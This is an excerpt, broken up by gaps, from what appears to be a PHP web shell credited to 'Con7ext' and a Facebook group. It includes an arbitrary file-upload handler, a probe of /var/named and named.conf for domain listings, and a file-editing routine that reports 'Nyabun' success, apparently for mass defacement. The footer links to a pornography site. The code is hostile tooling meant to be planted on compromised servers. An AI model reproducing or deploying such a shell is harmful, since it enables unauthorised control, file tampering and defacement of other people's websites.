...
<br>
<header>
<img src='http://www.qiura.net/web/wallpapers/sagiri-izumi-11/1920x1200.png' width='400' height='400' align='center'>
<br>
<br>
<form method='post'>
...
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=blue>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
			} else {
...
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
	...
	function edit_file($file,$index){
		...
		echo "<Span style='color:blue;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
...
echo '<font color="blue">Success !</font><br/>';
}else{
...
echo '<br><br><hr color="#191919"><br><center><br/>Copyright &copy '.date("Y").' <a href="https://www.porn720.org" target="_blank">Con7ext</a> - <a href="https://www.facebook.com/xaisyndicate" target="_blank">'.$_COPY.'</a></center>
</body>
</html>';
?>